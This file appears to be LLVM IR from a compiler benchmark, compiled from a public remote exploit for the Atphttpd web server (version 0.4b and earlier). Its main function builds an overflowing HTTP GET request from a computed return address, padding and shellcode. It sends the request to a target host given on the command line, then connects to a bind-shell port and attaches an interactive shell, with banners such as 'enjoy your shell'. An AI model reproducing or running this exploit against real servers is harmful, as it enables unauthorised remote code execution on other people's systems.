; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23188.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23188.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@DEFAULT_OFFSET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [65 x i8] c"(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net\0A\00", align 1
@.str.1 = private unnamed_addr constant [71 x i8] c"(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"[-] Usage: %s [host] <offset> #OFFset\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"<==> OFFSET: 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"<==> RET_ADDR: 0x%x\0A\00", align 1
@ALIGN = common dso_local global i64 0, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [40 x i8] c"<==> Connecting to '%s' on port '%d'..\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [37 x i8] c"<==> Couldn`t connect to host.. :-/\0A\00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"<==> Sending packets..\0A\00", align 1
@.str.8 = private unnamed_addr constant [45 x i8] c"<==> send(): while sending evil http request\00", align 1
@.str.9 = private unnamed_addr constant [54 x i8] c"<==> Exploit failed..! #Probably due to a bad offset\0A\00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c"\0A### Exploit failed \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [21 x i8] c"... just kidding ;]\0A\00", align 1
@.str.12 = private unnamed_addr constant [44 x i8] c"### Exploit successful - enjoy your shell\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %8, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %9, align 8
  store i64 0, i64* %10, align 8
  %17 = load i64, i64* @DEFAULT_OFFSET, align 8
  store i64 %17, i64* %11, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.1, i64 0, i64 0))
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %25, label %22

22:                                               ; preds = %2
  %23 = load i32, i32* %4, align 4
  %24 = icmp sgt i32 %23, 3
  br i1 %24, label %25, label %30

25:                                               ; preds = %22, %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0), i8* %28)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %223

30:                                               ; preds = %22
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %31, 2
  br i1 %32, label %33, label %38

33:                                               ; preds = %30
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i64 @atoi(i8* %36)
  store i64 %37, i64* %11, align 8
  br label %38

38:                                               ; preds = %33, %30
  %39 = load i64, i64* %11, align 8
  %40 = sub i64 3221225466, %39
  store i64 %40, i64* %10, align 8
  %41 = load i64, i64* %11, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i64 %41)
  %43 = load i64, i64* %10, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i64 %43)
  %45 = getelementptr inbounds i8, i8* %16, i64 0
  store i8 71, i8* %45, align 16
  %46 = getelementptr inbounds i8, i8* %16, i64 1
  store i8 69, i8* %46, align 1
  %47 = getelementptr inbounds i8, i8* %16, i64 2
  store i8 84, i8* %47, align 2
  %48 = getelementptr inbounds i8, i8* %16, i64 3
  store i8 32, i8* %48, align 1
  %49 = getelementptr inbounds i8, i8* %16, i64 4
  store i8 47, i8* %49, align 4
  store i32 5, i32* %6, align 4
  br label %50

50:                                               ; preds = %54, %38
  %51 = load i32, i32* %6, align 4
  %52 = load i32, i32* @LEN, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %94

54:                                               ; preds = %50
  %55 = load i64, i64* %10, align 8
  %56 = and i64 %55, 255
  %57 = trunc i64 %56 to i8
  %58 = load i64, i64* @ALIGN, align 8
  %59 = load i32, i32* %6, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  %61 = sext i32 %59 to i64
  %62 = add i64 %58, %61
  %63 = getelementptr inbounds i8, i8* %16, i64 %62
  store i8 %57, i8* %63, align 1
  %64 = load i64, i64* %10, align 8
  %65 = and i64 %64, 65280
  %66 = lshr i64 %65, 8
  %67 = trunc i64 %66 to i8
  %68 = load i64, i64* @ALIGN, align 8
  %69 = load i32, i32* %6, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %6, align 4
  %71 = sext i32 %69 to i64
  %72 = add i64 %68, %71
  %73 = getelementptr inbounds i8, i8* %16, i64 %72
  store i8 %67, i8* %73, align 1
  %74 = load i64, i64* %10, align 8
  %75 = and i64 %74, 16711680
  %76 = lshr i64 %75, 16
  %77 = trunc i64 %76 to i8
  %78 = load i64, i64* @ALIGN, align 8
  %79 = load i32, i32* %6, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %6, align 4
  %81 = sext i32 %79 to i64
  %82 = add i64 %78, %81
  %83 = getelementptr inbounds i8, i8* %16, i64 %82
  store i8 %77, i8* %83, align 1
  %84 = load i64, i64* %10, align 8
  %85 = and i64 %84, 4278190080
  %86 = lshr i64 %85, 24
  %87 = trunc i64 %86 to i8
  %88 = load i64, i64* @ALIGN, align 8
  %89 = load i32, i32* %6, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %6, align 4
  %91 = sext i32 %89 to i64
  %92 = add i64 %88, %91
  %93 = getelementptr inbounds i8, i8* %16, i64 %92
  store i8 %87, i8* %93, align 1
  br label %50

94:                                               ; preds = %50
  store i32 5, i32* %6, align 4
  br label %95

95:                                               ; preds = %104, %94
  %96 = load i32, i32* %6, align 4
  %97 = load i32, i32* @LEN, align 4
  %98 = sdiv i32 %97, 2
  %99 = icmp slt i32 %96, %98
  br i1 %99, label %100, label %107

100:                                              ; preds = %95
  %101 = load i32, i32* %6, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %16, i64 %102
  store i8 65, i8* %103, align 1
  br label %104

104:                                              ; preds = %100
  %105 = load i32, i32* %6, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %6, align 4
  br label %95

107:                                              ; preds = %95
  store i32 0, i32* %6, align 4
  br label %108

108:                                              ; preds = %129, %107
  %109 = load i32, i32* %6, align 4
  %110 = load i8*, i8** @shellcode, align 8
  %111 = call i32 @strlen(i8* %110)
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %132

113:                                              ; preds = %108
  %114 = load i8*, i8** @shellcode, align 8
  %115 = load i32, i32* %6, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  %118 = load i8, i8* %117, align 1
  %119 = load i32, i32* @LEN, align 4
  %120 = sdiv i32 %119, 2
  %121 = load i8*, i8** @shellcode, align 8
  %122 = call i32 @strlen(i8* %121)
  %123 = sdiv i32 %122, 2
  %124 = sub nsw i32 %120, %123
  %125 = load i32, i32* %6, align 4
  %126 = add nsw i32 %124, %125
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %16, i64 %127
  store i8 %118, i8* %128, align 1
  br label %129

129:                                              ; preds = %113
  %130 = load i32, i32* %6, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %6, align 4
  br label %108

132:                                              ; preds = %108
  %133 = load i32, i32* @LEN, align 4
  %134 = sub nsw i32 %133, 12
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %16, i64 %135
  store i8 32, i8* %136, align 1
  %137 = load i32, i32* @LEN, align 4
  %138 = sub nsw i32 %137, 11
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %16, i64 %139
  store i8 72, i8* %140, align 1
  %141 = load i32, i32* @LEN, align 4
  %142 = sub nsw i32 %141, 10
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8, i8* %16, i64 %143
  store i8 84, i8* %144, align 1
  %145 = load i32, i32* @LEN, align 4
  %146 = sub nsw i32 %145, 9
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %16, i64 %147
  store i8 84, i8* %148, align 1
  %149 = load i32, i32* @LEN, align 4
  %150 = sub nsw i32 %149, 8
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %16, i64 %151
  store i8 80, i8* %152, align 1
  %153 = load i32, i32* @LEN, align 4
  %154 = sub nsw i32 %153, 7
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i8, i8* %16, i64 %155
  store i8 47, i8* %156, align 1
  %157 = load i32, i32* @LEN, align 4
  %158 = sub nsw i32 %157, 6
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8, i8* %16, i64 %159
  store i8 49, i8* %160, align 1
  %161 = load i32, i32* @LEN, align 4
  %162 = sub nsw i32 %161, 5
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8, i8* %16, i64 %163
  store i8 46, i8* %164, align 1
  %165 = load i32, i32* @LEN, align 4
  %166 = sub nsw i32 %165, 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %16, i64 %167
  store i8 49, i8* %168, align 1
  %169 = load i32, i32* @LEN, align 4
  %170 = sub nsw i32 %169, 3
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8, i8* %16, i64 %171
  store i8 13, i8* %172, align 1
  %173 = load i32, i32* @LEN, align 4
  %174 = sub nsw i32 %173, 2
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8, i8* %16, i64 %175
  store i8 10, i8* %176, align 1
  %177 = load i32, i32* @LEN, align 4
  %178 = sub nsw i32 %177, 1
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8, i8* %16, i64 %179
  store i8 0, i8* %180, align 1
  %181 = load i8**, i8*** %5, align 8
  %182 = getelementptr inbounds i8*, i8** %181, i64 1
  %183 = load i8*, i8** %182, align 8
  %184 = load i32, i32* @PORT, align 4
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0), i8* %183, i32 %184)
  %186 = load i8**, i8*** %5, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 1
  %188 = load i8*, i8** %187, align 8
  %189 = load i32, i32* @PORT, align 4
  %190 = call i32 @connect_to_host(i8* %188, i32 %189)
  store i32 %190, i32* %7, align 4
  %191 = icmp slt i32 %190, 0
  br i1 %191, label %192, label %195

192:                                              ; preds = %132
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  %194 = call i32 @exit(i32 1) #4
  unreachable

195:                                              ; preds = %132
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  %197 = load i32, i32* %7, align 4
  %198 = load i32, i32* @LEN, align 4
  %199 = call i64 @send(i32 %197, i8* %16, i32 %198, i32 0)
  %200 = icmp slt i64 %199, 0
  br i1 %200, label %201, label %203

201:                                              ; preds = %195
  %202 = call i32 @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %223

203:                                              ; preds = %195
  %204 = load i32, i32* %7, align 4
  %205 = call i32 @close(i32 %204)
  %206 = load i8**, i8*** %5, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 1
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @connect_to_host(i8* %208, i32 65535)
  store i32 %209, i32* %7, align 4
  %210 = icmp slt i32 %209, 0
  br i1 %210, label %211, label %213

211:                                              ; preds = %203
  %212 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %223

213:                                              ; preds = %203
  %214 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0))
  %215 = load i32, i32* @stdout, align 4
  %216 = call i32 @fflush(i32 %215)
  %217 = call i32 @sleep(i32 1)
  %218 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  %219 = call i32 @sleep(i32 1)
  %220 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.12, i64 0, i64 0))
  %221 = load i32, i32* %7, align 4
  %222 = call i32 @shell(i32 %221)
  store i32 1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %223

223:                                              ; preds = %213, %211, %201, %25
  %224 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %224)
  %225 = load i32, i32* %3, align 4
  ret i32 %225
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @connect_to_host(i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shell(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
